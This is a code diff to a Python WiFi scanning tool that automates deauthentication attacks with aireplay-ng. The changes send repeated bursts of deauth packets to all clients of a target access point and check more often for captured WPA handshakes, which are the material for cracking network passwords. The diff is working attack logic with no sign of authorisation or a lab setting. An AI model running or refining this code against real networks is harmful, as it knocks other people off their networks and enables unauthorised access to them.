@@ -397,12 +397,13 @@ class WiFiScanner:
         try:
             logger.info(f"💥 Sending deauth to {ssid}...")
             
-            # Send deauth packets
-            # --deauth: number of deauth packets to send
+            # Send deauth packets to broadcast (all clients)
+            # --deauth: number of deauth packets to send (increased to 20 for better coverage)
             # -a: AP MAC address
+            # Using broadcast (FF:FF:FF:FF:FF:FF) to target all clients
             result = subprocess.run([
                 'aireplay-ng',
-                '--deauth', '10',
+                '--deauth', '20',
                 '-a', bssid,
                 self.interface
             ], capture_output=True, text=True, timeout=30)
@@ -411,6 +412,18 @@ class WiFiScanner:
                 logger.info(f"✓ Deauth sent to {ssid}")
                 capture_info['deauth_sent'] = True
                 capture_info['deauth_time'] = time.time()  # Track when deauth was sent
+                
+                # Send a second burst after 10 seconds to catch clients that weren't active
+                time.sleep(10)
+                logger.info(f"💥 Sending follow-up deauth to {ssid}...")
+                result2 = subprocess.run([
+                    'aireplay-ng',
+                    '--deauth', '20',
+                    '-a', bssid,
+                    self.interface
+                ], capture_output=True, text=True, timeout=30)
+                if result2.returncode == 0:
+                    logger.info(f"✓ Follow-up deauth sent to {ssid}")
             else:
                 logger.warning(f"Deauth failed for {ssid}: {result.stderr[:200]}")
                 capture_info['deauth_sent'] = True  # Mark as sent anyway
@@ -425,7 +438,7 @@ class WiFiScanner:
         
         while self.running:
             try:
-                time.sleep(30)  # Check every 30 seconds
+                time.sleep(5)  # Check more frequently (every 5 seconds)
                 
                 for bssid in list(self.active_captures.keys()):
                     capture_info = self.active_captures[bssid]
@@ -440,13 +453,13 @@ class WiFiScanner:
                     
                     # Check for handshake
                     if capture_info.get('deauth_sent', False):
-                        # Wait at least 30 seconds after deauth for full reconnection
-                        # (authentication + association + 4-way handshake)
+                        # Wait at least 10 seconds after deauth before first check
+                        # Then check every 5 seconds
                         deauth_time = capture_info.get('deauth_time', 0)
                         time_since_deauth = time.time() - deauth_time
                         
-                        if time_since_deauth < 30:
-                            logger.info(f"⏳ Waiting for {ssid} to reconnect ({int(time_since_deauth)}s)")
+                        if time_since_deauth < 10:
+                            logger.debug(f"Waiting for {ssid} to reconnect ({int(time_since_deauth)}s)")
                             continue
                         
                         has_handshake = self._check_handshake(capture_info['capture_file'])
@@ -458,7 +471,9 @@ class WiFiScanner:
                             logger.warning(f"❌ Timeout for {ssid} ({int(elapsed)}s)")
                             self._finalize_capture(bssid, success=False)
                         else:
-                            logger.info(f"🔍 Checking {ssid} handshake ({int(elapsed)}s)")
+                            # Only log every 30 seconds to avoid spam
+                            if int(time_since_deauth) % 30 < 5:
+                                logger.info(f"🔍 Checking {ssid} handshake ({int(elapsed)}s)")
             
             except Exception as e:
                 logger.error(f"Capture monitor error: {e}")
